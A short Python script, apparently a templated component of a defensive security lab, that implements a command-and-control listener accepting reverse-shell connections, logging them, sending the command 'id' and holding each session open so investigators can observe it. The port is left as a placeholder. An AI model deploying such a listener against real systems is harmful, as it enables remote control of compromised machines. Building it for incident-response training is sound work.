#!/usr/bin/env python3
# C2 listener: nghe cong C2PORT, GHI LOG moi ket noi reverse shell goi ve,
# va GIU ket noi mo (de phia phong thu thay ket noi ESTABLISHED khi dieu tra).
import socket
import threading
import time

HOST = "0.0.0.0"
PORT = C2PORT  # ca nhan hoa qua RAND_REPLACE

def handle(conn, addr):
    print(time.strftime("%Y-%m-%d %H:%M:%S"), "CONNECT from", addr, flush=True)
    try:
        conn.sendall(b"id\n")          # gui 1 lenh (mo phong C2 ra lenh)
        while True:
            data = conn.recv(4096)     # giu ket noi, doc output shell
            if not data:
                break
    except Exception:
        pass
    finally:
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "DISCONNECT", addr, flush=True)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT))
srv.listen(5)
print(time.strftime("%Y-%m-%d %H:%M:%S"), "C2 listening on", PORT, flush=True)

while True:
    try:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
    except Exception:
        time.sleep(1)
